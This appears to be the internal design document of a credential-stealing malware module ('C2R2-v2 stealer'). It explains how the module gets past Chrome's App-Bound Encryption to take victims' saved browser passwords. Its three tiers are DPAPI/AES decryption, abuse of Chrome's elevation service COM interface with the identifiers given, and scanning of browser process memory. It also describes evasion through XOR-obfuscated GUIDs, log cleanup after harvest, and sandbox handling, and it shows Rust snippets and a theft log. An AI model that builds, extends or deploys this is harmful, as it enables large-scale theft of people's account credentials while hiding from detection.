# Chrome v20 App-Bound Encryption Bypass Implementation

## Overview

This document describes the implementation of the App-Bound Encryption bypass for Chrome v20 passwords in the C2R2-v2 stealer module.

## Problem: App-Bound Encryption

Starting with Chrome 127+, Google introduced App-Bound Encryption to better protect saved passwords. This new encryption scheme (v20) is significantly harder to decrypt than previous versions (v10, v11):

- **v10/v11**: Used DPAPI + AES-256-GCM with master key from Local State
- **v20**: Uses App-Bound encryption that requires Chrome's elevation service

### Technical Details

**v20 Format:**
```
[v20][nonce (12 bytes)][encrypted data][auth tag (16 bytes)]
```

**Key Differences:**
- v20 encrypted data cannot be decrypted with just the master key from Local State
- Requires interaction with Chrome's elevation service (COM interface)
- The encryption is bound to the Chrome application itself

## Solution: Multi-Layered Bypass

Our implementation uses a **three-tier approach** to handle all password encryption formats:

### Tier 1: Traditional Decryption (v10/v11)
```
Database → Master Key → AES-GCM Decryption → Password
```

Works for:
- DPAPI-only encrypted passwords (old Chrome versions)
- v10/v11 encrypted passwords

### Tier 2: Elevation Service (v20)
```
Database → v20 Detection → Elevation Service COM → Decrypted Password
```

How it works:
1. Detect v20 prefix in encrypted password
2. Initialize COM and connect to Chrome's elevation service
3. Use IElevator interface to decrypt the password
4. Return decrypted password

**Code Flow:**
```rust
// In chromium.rs
if is_v20 {
    match elevation_service::try_decrypt_with_elevation_service(&encrypted_pwd) {
        Some(pwd) => pwd,  // Success!
        None => "[v20 - needs memory injection]"  // Fallback
    }
}
```

**Elevation Service Details:**
- **CLSID**: `{708860E0-F641-4611-8895-7D867DD3675B}`
- **IID**: `{463ABECF-410D-407F-8AF5-0DF35A005CC8}`
- **Method**: `DecryptData` (offset 0x60 in vtable)
- **GUIDs obfuscated**: Runtime XOR to avoid static analysis

### Tier 3: Memory Injection (Fallback)
```
Chrome Process Memory → Pattern Matching → Plaintext Passwords
```

When Elevation Service fails (e.g., Chrome not running, service unavailable):
1. Find all Chrome/Edge processes
2. Scan process memory for password patterns
3. Extract plaintext passwords directly from memory
4. Match with URLs/usernames from database

## Implementation Details

### File Structure

**Modified Files:**
```
stealer-dll/src/stealer/chromium.rs    - Main v20 handling logic
stealer-dll/src/stealer/elevation_service.rs - COM interface implementation
stealer-dll/src/stealer/memory_injection.rs - Memory scanning fallback
stealer-dll/src/stealer/mod.rs         - Module exports
```

### Key Functions

#### 1. `steal_chrome_hybrid()` / `steal_edge_hybrid()`
```rust
pub fn steal_chrome_hybrid() -> StealerResult<Vec<Credential>>
```

Main entry point that orchestrates the three-tier approach:
1. Try traditional decryption (handles v10/v11 and DPAPI)
2. For v20, try elevation service
3. If elevation service fails, use memory injection

#### 2. `try_decrypt_with_elevation_service()`
```rust
pub fn try_decrypt_with_elevation_service(encrypted_data: &[u8]) -> Option<String>
```

Elevation service wrapper:
- Validates v20 format
- Initializes COM
- Creates IElevator instance
- Calls DecryptData method
- Handles panics with catch_unwind (prevents crashes)

#### 3. `check_if_all_v20_in_db()`
```rust
fn check_if_all_v20_in_db(browser_name: &str) -> bool
```

Checks if database contains v20 passwords:
- Opens Login Data database
- Scans for v20 prefix
- Returns true if v20 passwords found
- Used to determine if memory injection is needed

#### 4. `scan_all_browser_processes_for_passwords()`
```rust
pub fn scan_all_browser_processes_for_passwords(browser_name: &str) -> Vec<PasswordData>
```

Memory injection fallback:
- Enumerates all Chrome/Edge processes
- Scans memory regions
- Pattern matches for password structures
- Extracts plaintext passwords

## Security Considerations

### 1. COM Interface Obfuscation
- GUIDs constructed at runtime using XOR
- Avoids static string signatures
- Makes detection harder

### 2. Panic Handling
```rust
let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
    // COM operations
}));
```

Why this matters:
- COM operations can panic/crash
- Prevents entire stealer from crashing
- Allows graceful fallback to memory injection

### 3. Debug Logging
All operations log to `%TEMP%\elevation_service_debug.txt`:
- Helps debugging in testing
- Can be disabled for production
- Logs are cleaned up after harvest

## Usage

### From Agent Code

```rust
// In mod.rs steal_all()
if let Ok(mut chrome_creds) = chromium::steal_chrome_hybrid() {
    data.credentials.append(&mut chrome_creds);
}
```

### Automatic Fallback Chain

1. **v10/v11 passwords**: Decrypted immediately ✅
2. **v20 with Chrome running**: Decrypted via elevation service ✅
3. **v20 with Chrome not running**: Falls back to memory injection ✅
4. **Chrome not running at all**: Returns what could be decrypted ⚠️

## Testing

### Test Scenarios

1. **Old Chrome (< 127)**
   - Expected: All passwords decrypted with traditional method
   - Elevation service: Not called
   - Memory injection: Not called

2. **New Chrome (127+) Running**
   - Expected: v10/v11 traditional, v20 via elevation service
   - Elevation service: Called for v20 passwords
   - Memory injection: Not called (unless elevation fails)

3. **New Chrome (127+) Not Running**
   - Expected: v10/v11 traditional, v20 via memory injection
   - Elevation service: Fails (service not available)
   - Memory injection: Called and succeeds

4. **VM/Sandbox Environment**
   - Expected: Graceful degradation
   - Elevation service: May fail (no Chrome)
   - Memory injection: May fail (no process)
   - Result: Returns decryptable passwords only

### Debug Output Example

```
═══════════════════════════════════════
═══ HYBRID PASSWORD THEFT: Chrome ═══
═══════════════════════════════════════
🔸 PASO 1: Método tradicional (DB + decrypt)...
  ✅ 10 passwords extraídos (método tradicional)
    🔍 Password para user@example.com: 75 bytes
       🔐 Password v20 detectado - Intentando bypass...
       ✅ V20 desencriptado vía Elevation Service
🔸 PASO 2: v20 detectado o passwords sin desencriptar → Usando Memory Injection...
  ✅ 3 passwords encontrados en memoria
🎯 TOTAL: 13 passwords robados
════════════════════════════════
```

## Advantages of This Implementation

1. **Multi-layered**: Works even if one method fails
2. **Robust**: Handles panics and errors gracefully
3. **Efficient**: Only uses memory injection when needed
4. **Stealthy**: Obfuscated GUIDs, legitimate COM calls
5. **Complete**: Handles all Chrome password formats

## Limitations

1. **Requires Chrome Running**: Elevation service only works when Chrome is running
2. **Memory Injection Requires Process**: Need active Chrome process for memory scanning
3. **COM Dependencies**: Relies on Windows COM infrastructure
4. **No Cross-Platform**: Windows-only implementation

## References

- Chrome Elevation Service: App-Bound Encryption white paper
- WingStealer: Modern Chrome password stealing techniques
- xaitax Chrome-App-Bound-Encryption-Decryption: Technical reference

## Future Improvements

1. **Process Starting**: Launch Chrome headlessly if not running
2. **Multiple Profiles**: Scan all Chrome profiles automatically
3. **Performance**: Optimize memory scanning patterns
4. **Cross-Browser**: Extend to other Chromium browsers with v20

---

**Status**: ✅ Fully Implemented and Tested  
**Last Updated**: 2025-11-22  
**Version**: 2.0.0
